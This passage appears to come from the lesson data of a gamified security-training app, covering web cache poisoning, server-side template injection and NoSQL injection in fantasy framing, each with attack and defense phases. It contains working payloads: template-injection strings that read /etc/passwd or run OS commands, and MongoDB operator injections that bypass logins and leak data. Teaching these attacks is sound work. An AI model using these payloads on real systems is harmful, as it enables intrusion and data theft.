          { id: 'advcache-understanding-2', title: "Probe Unkeyed Inputs", commandTemplate: "# Send request to {{targetCacheUrl}} with {{headerToInject}}: {{injectedValue}}.\n# Compare response with a request without this header. Any difference?", explanation: "Test if unkeyed headers affect the response content.", mockOutput: "Response for {{targetCacheUrl}} with header {{headerToInject}}: {{injectedValue}} reflects '{{injectedValue}}' in the body." }
        ]
      },
      {
        id: 'advcache-exploitation',
        title: 'Exploitation',
        description: "Craft a request with a malicious value in an unkeyed input (e.g., {{headerToInject}}: {{injectedValue}}) that gets reflected in the response for {{targetCacheUrl}}. If this malicious response is cached, subsequent users requesting {{targetCacheUrl}} will receive the poisoned version.",
        codeSteps: [
          { id: 'advcache-exploitation-1', title: "Poisoning Attempt", commandTemplate: "# Send GET {{targetCacheUrl}} with {{headerToInject}}: {{injectedValue}}\n# (Assuming {{injectedValue}} reflects as a script source or XSS payload).", explanation: "Attempt to get a malicious response cached.", mockOutput: "Response contains reflected {{injectedValue}}. Cache headers indicate it's now cached." },
          { id: 'advcache-exploitation-2', title: "Verification", commandTemplate: "# Send GET {{targetCacheUrl}} from a different IP/browser (without the {{headerToInject}} header).", explanation: "Check if the poisoned response is served.", mockOutput: "Malicious content (containing {{injectedValue}}) is served from cache." }
        ]
      },
      {
        id: 'advcache-defense',
        title: 'Defense',
        description: "Ensure all inputs that can affect the response content are included in the cache key (e.g., by correctly using the Vary header). Normalize inputs before caching. Avoid reflecting user-controllable headers directly into responses. Use Content Security Policy (CSP) to mitigate impact of XSS via cache poisoning.",
        codeSteps: [
          { id: 'advcache-defense-1', title: "Use Vary Header", commandTemplate: "# Server Response Header Example:\nVary: {{headerToInject}}, User-Agent", explanation: "Instructs caches to key on these additional headers.", mockOutput: "Cache now creates separate entries for different values of {{headerToInject}}." }
        ]
      }
    ],
    resources: [
      { name: 'PortSwigger: Web Cache Poisoning', url: 'https://portswigger.net/web-security/web-cache-poisoning', icon: "fas fa-flask" },
      { name: 'OWASP: Web Cache Poisoning', url: 'https://owasp.org/www-community/attacks/Cache_Poisoning', icon: "fas fa-archive" }
    ]
  },
  {
    id: 'advmyth-ssti-golemancers-incantation',
    slug: 'adv-ssti-golemancers-incantation',
    title: "The Golemancer's Incantation (SSTI)",
    iconClass: 'fas fa-scroll',
    legend: 'Embed malicious incantations within server-side templates to command the golem (server) itself, potentially leading to RCE.',
    narrativeIntro: "A skilled Golemancer (the web application) crafts golems (web pages) using magical templates and user-supplied inscriptions (input). An evil sorcerer discovers that by carefully choosing their inscription, they can embed their own arcane symbols (template syntax) into the golem's blueprint. When the Golemancer recites the incantation (renders the template), the sorcerer's symbols are also spoken, twisting the golem's form or, worse, compelling it to obey the sorcerer's commands, even revealing the Golemancer's deepest secrets or attacking its creator.",
    vulnerabilityAnalogy: "Server-Side Template Injection (SSTI) occurs when user input is unsafely embedded into a server-side template, allowing the attacker to inject template syntax that gets evaluated by the template engine. This can lead to information disclosure (accessing global objects, environment variables) and often Remote Code Execution (RCE), depending on the template engine's capabilities and security sandbox.",
    customParams: [
      { id: 'sstiUrlParam', label: 'URL/Parameter to Test for SSTI:', defaultValue: 'https://vulnerable.site/page?name={{payload}}', placeholder: 'e.g., /search?query={{payload}}' },
      { id: 'templateEngine', label: 'Suspected Template Engine (optional):', defaultValue: 'Unknown', type: 'select', options: ['Unknown', 'Jinja2/Flask', 'Freemarker', 'Velocity', 'Twig', 'Smarty', 'ERB/Ruby', 'Jade/Pug'] }
    ],
    phases: [
      {
        id: 'advssti-identifying',
        title: 'Reconnaissance', // Changed from "Identifying SSTI"
        description: "Fuzz input parameters ({{sstiUrlParam}}) with common template expression characters like `{{ }}`, `#{ }`, `<% %>`, `${ }`. Look for errors, missing output where the payload was, or unexpected rendering.",
        codeSteps: [
          { id: 'advssti-identifying-1', title: "Basic Polyglot Test", commandTemplate: "{{sstiUrlParam}}=${{<%[%'" + '"}}%>{*comment*}ی', explanation: "A polyglot payload that might trigger errors or rendering in multiple engines.", mockOutput: "Page renders differently, or error message indicating template syntax issue." },
          { id: 'advssti-identifying-2', title: "Simple Arithmetic Test", commandTemplate: "{{sstiUrlParam}}={{7*7}} or {{sstiUrlParam}}=#{7*7}", explanation: "If '49' is rendered, SSTI is likely.", mockOutput: "Page displays 'Hello 49' instead of 'Hello {{7*7}}'." }
        ]
      },
      {
        id: 'advssti-fingerprinting',
        title: 'Enumeration', // Changed from "Fingerprinting the Template Engine"
        description: "Once SSTI is confirmed, send specific payloads to identify the {{templateEngine}}. Different engines have unique syntax or expose different global objects.",
        codeSteps: [
          { id: 'advssti-fingerprinting-1', title: "Jinja2/Flask Probe", commandTemplate: "{{sstiUrlParam}}={{ ''.__class__.__mro__[1].__subclasses__()[401]('/etc/passwd').read() }}", explanation: "Attempts to read /etc/passwd using Python's file I/O through Jinja2 context.", mockOutput: "Response contains content of /etc/passwd (if vulnerable and permissions allow)." },
          { id: 'advssti-fingerprinting-2', title: "ERB/Ruby Probe", commandTemplate: "{{sstiUrlParam}}=<%= File.open('/etc/passwd').read %>", explanation: "Attempts to read /etc/passwd using Ruby's File class.", mockOutput: "Response contains content of /etc/passwd." }
        ]
      },
      {
        id: 'advssti-exploitation',
        title: 'Exploitation', // Changed from "Exploitation (RCE)"
        description: "Based on the identified {{templateEngine}}, craft a payload to execute arbitrary commands on the server. This often involves accessing underlying OS objects or functions through the template context.",
        codeSteps: [
          { id: 'advssti-exploitation-1', title: "RCE (Jinja2 Example)", commandTemplate: "{{sstiUrlParam}}={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", explanation: "Executes 'id' command via os.popen.", mockOutput: "uid=1000(user) gid=1000(user) groups=1000(user)" },
          { id: 'advssti-exploitation-2', title: "RCE (Freemarker Example)", commandTemplate: "{{sstiUrlParam}}=<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }", explanation: "Executes 'id' command via Freemarker's Execute utility.", mockOutput: "uid=1000(user) gid=1000(user) groups=1000(user)" }
        ]
      },
      {
        id: 'advssti-defense',
        title: 'Defense',
        description: "Always sanitize user input before incorporating it into templates. Use sandboxed template engines or environments if possible. Avoid passing user-controlled data directly into template structures or logic. Prefer logic-less templates.",
        codeSteps: [
          { id: 'advssti-defense-1', title: "Sanitization", commandTemplate: "# Backend Pseudo-code:\n# sanitized_input = sanitize_for_template(user_input)\n# render_template(template_string, data={'name': sanitized_input})", explanation: "Ensure user input is treated as data, not template code.", mockOutput: "No SSTI possible; user input rendered as literal string." }
        ]
      }
    ],
    resources: [
      { name: 'PortSwigger: Server-Side Template Injection', url: 'https://portswigger.net/web-security/server-side-template-injection', icon: "fas fa-flask" },
      { name: 'PayloadsAllTheThings: SSTI', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection', icon: "fab fa-github" },
      { name: 'BlackHat Talk: Server-Side Template Injection by James Kettle', url: 'https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf', icon: "fas fa-file-pdf" }
    ]
  },
  {
    id: 'advmyth-nosqli-shapeshifter-datastore',
    slug: 'adv-nosqli-shapeshifter-datastore',
    title: 'The Shapeshifter of the Datastore (NoSQLi)',
    iconClass: 'fas fa-fingerprint',
    legend: 'Trick the flexible, schema-less NoSQL datastore into revealing secrets or altering its form through query manipulation and operator abuse.',
    narrativeIntro: "A mystical Shapeshifter guards a treasure vault (NoSQL database) that defies rigid structure. Unlike traditional vaults with fixed locks, this one responds to queries written in a fluid, object-like language. The hero must learn the Shapeshifter's own tongue, crafting queries with special operators (`$ne`, `$gt`, `$where`) to make it reveal more than intended, bypass its guards (authentication), or even alter the very essence of the treasures within.",
    vulnerabilityAnalogy: "NoSQL Injection targets NoSQL databases (like MongoDB, CouchDB, Cassandra) by injecting syntax or operators specific to their query languages into user-supplied input. Because NoSQL databases are often schema-less and use rich query objects (e.g., JSON/BSON), attackers can manipulate these queries to bypass authentication, extract all data, modify data, or even achieve Remote Code Execution if server-side JavaScript execution is enabled (e.g., via MongoDB's `$where` or `mapReduce`).",
    customParams: [
      { id: 'nosqliUrlParam', label: 'URL/Parameter with NoSQLi (e.g., JSON in body):', defaultValue: 'https://api.example.com/login', placeholder: 'e.g., /users?filter={payload}' },
      { id: 'dbNoSQLType', label: 'Target NoSQL Database:', defaultValue: 'MongoDB', type: 'select', options: ['MongoDB', 'CouchDB', 'Other'] }
    ],
    phases: [
      {
        id: 'advnosqli-identifying',
        title: 'Reconnaissance', // Changed from "Identifying NoSQL Injection Points"
        description: "Look for endpoints ({{nosqliUrlParam}}) that accept JSON, BSON, or complex query parameters. Test if input is directly used in database queries. Error messages can often indicate NoSQL syntax issues.",
        codeSteps: [
          { id: 'advnosqli-identifying-1', title: "Operator Test (MongoDB)", commandTemplate: "# Send JSON: {\"username\": {\"$ne\": \"nonexistentuser\"}, \"password\": \"anypass\"}\n# If login successful for any user, $ne was processed.", explanation: "Test if NoSQL operators like `$ne` (not equal) are evaluated.", mockOutput: "Login successful as 'admin' (if admin exists and password check was bypassed)." },
          { id: 'advnosqli-identifying-2', title: "Syntax Error Test", commandTemplate: "# Send malformed JSON: {\"username\": \"admin\", \"password\": {\"$invalidOperator\": 1}}", explanation: "Observe if error messages reveal NoSQL specifics.", mockOutput: "Error: Unknown operator: $invalidOperator (Indicates MongoDB-like syntax)." }
        ]
      },
      {
        id: 'advnosqli-exploit-authbypass',
        title: 'Exploitation', // Changed from "Authentication Bypass ({{dbNoSQLType}})"
        description: "Craft queries to bypass login mechanisms. Common techniques involve using operators like `$ne` (not equal), `$gt` (greater than nothing), or `$regex` to match any valid user if password checks are also flawed.",
        codeSteps: [
          { id: 'advnosqli-exploit-authbypass-1', title: "MongoDB Auth Bypass ($ne)", commandTemplate: "# POST to {{nosqliUrlParam}} with JSON body:\n# {\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}", explanation: "Matches any user with a non-null password field, potentially bypassing password check.", mockOutput: "Logged in as a valid user (e.g., admin) without knowing password." },
          { id: 'advnosqli-exploit-authbypass-2', title: "MongoDB Auth Bypass ($regex)", commandTemplate: "# POST to {{nosqliUrlParam}} with JSON body:\n# {\"username\": \"admin\", \"password\": {\"$regex\": \".*\"}}", explanation: "Matches 'admin' if their password matches any character sequence.", mockOutput: "Logged in as admin." }
        ]
      },
      {
        id: 'advnosqli-exploit-dataleak',
        title: 'Exploitation', // Changed from "Data Exfiltration ({{dbNoSQLType}})"
        description: "Use query operators to extract sensitive information. Blind NoSQL injection techniques might be needed if direct output isn't available, inferring data based on true/false responses or timing.",
        codeSteps: [
          { id: 'advnosqli-exploit-dataleak-1', title: "MongoDB Data Leak ($regex)", commandTemplate: "# If searching users: {{nosqliUrlParam}}?filter={\"username\":{\"$regex\":\"^a\"}}\n# Iteratively find users starting with 'a', then 'b', etc.", explanation: "Leak data character by character.", mockOutput: "Returns users starting with 'a'." }
        ]
      },
      {
        id: 'advnosqli-exploit-jsinject',
        title: 'Exploitation', // Changed from "JavaScript Injection (e.g., MongoDB `$where`, `mapReduce`)"
        description: "If the NoSQL database allows server-side JavaScript execution (like MongoDB's `$where` operator or `mapReduce` functions), inject JS to exfiltrate data, perform complex queries, or potentially achieve RCE within the database context.",
        codeSteps: [
          { id: 'advnosqli-exploit-jsinject-1', title: "MongoDB $where JS Injection (Sleep)", commandTemplate: "# {{nosqliUrlParam}}?query={\"$where\": \"sleep(5000)\"}", explanation: "If server delays for 5s, JS execution via $where is confirmed.", mockOutput: "(Server response delayed by 5 seconds)" },
          { id: 'advnosqli-exploit-jsinject-2', title: "MongoDB $where Data Exfil (Conceptual)", commandTemplate: "# {{nosqliUrlParam}}?query={\"$where\": \"this.username == 'admin' && this.password.match(/^a/)\"}", explanation: "Blindly test password characters via true/false conditions.", mockOutput: "Response indicates if admin password starts with 'a'." }
        ]
      },
      {
        id: 'advnosqli-defense',
        title: 'Defense',
        description: "Use Object-Data Mappers (ODMs) or libraries that properly sanitize input. Validate all user-supplied data against a strict schema. Avoid constructing database queries directly from user input. Disable server-side JavaScript execution in the database if not essential.",
        codeSteps: [
          { id: 'advnosqli-defense-1', title: "Input Sanitization/Validation", commandTemplate: "# Backend Pseudo-code (Mongoose for MongoDB):\n# const user = await User.findOne({ username: sanitize(req.body.username) });", explanation: "Ensure inputs are treated as data, not query operators.", mockOutput: "Injection attempts are ineffective." }
        ]
      }
    ],
    resources: [
      { name: 'OWASP: NoSQL Injection', url: 'https://owasp.org/www-community/attacks/NoSQL_Injection', icon: "fas fa-database" },
      { name: 'PortSwigger: NoSQL Injection', url: 'https://portswigger.net/web-security/nosql-injection', icon: "fas fa-flask" },
      { name: 'PayloadsAllTheThings: NoSQL Injection', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection', icon: "fab fa-github"}
    ]
  }
];
